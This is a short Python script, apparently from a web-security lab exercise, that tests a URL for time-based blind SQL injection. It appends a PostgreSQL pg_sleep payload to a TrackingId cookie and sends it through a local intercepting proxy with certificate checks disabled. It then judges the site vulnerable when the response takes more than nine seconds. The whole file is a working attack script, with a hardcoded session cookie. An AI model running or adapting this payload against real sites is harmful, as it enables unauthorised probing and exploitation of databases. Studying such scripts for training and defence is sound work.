import sys
import requests
import urllib3
import urllib

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def blind_sqli_check(url):
    sql_payload = "' || (SELECT pg_sleep(10))--'"
    sql_payload_encoded = urllib.parse.quote(sql_payload)
    cookie = {'TrackingId': 'qdLkhQ2HZ2U1NC6V' + sql_payload_encoded, 'session': 'Ts63HPCNEv59AOKTGS4Jk7uTOW2s2TFK'}
    r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 9:
        print('[+] Vulnerable to blind-based SQLi')
    else:
        print('Not vulnerable to blind-based SQLi')


def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} www.example.com')
    url = sys.argv[1]
    print('[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...')
    blind_sqli_check(url)

if __name__ == '__main__':
    main()